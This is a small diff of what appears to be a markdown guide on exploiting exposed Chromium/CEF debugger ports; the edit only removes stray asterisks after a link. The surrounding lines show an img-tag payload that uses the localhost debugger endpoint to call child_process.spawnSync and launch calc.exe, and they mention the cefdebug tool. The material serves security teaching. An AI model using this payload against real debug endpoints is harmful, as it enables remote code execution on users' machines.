@@ -9,7 +9,7 @@ The abuse of this vulnerability remotely could be as easy as injecting via XSS t
 <img src="http://localhost:40000/json/new/?javascript:require('child_process').spawnSync('calc.exe')">
 ```
 
-But obviously the exploitation will be **much easier locally**, as you can use a tool such as: [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)\*\*\*\*
+But obviously the exploitation will be **much easier locally**, as you can use a tool such as: [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)
 
 ```bash
 #List possible vulnerable sockets
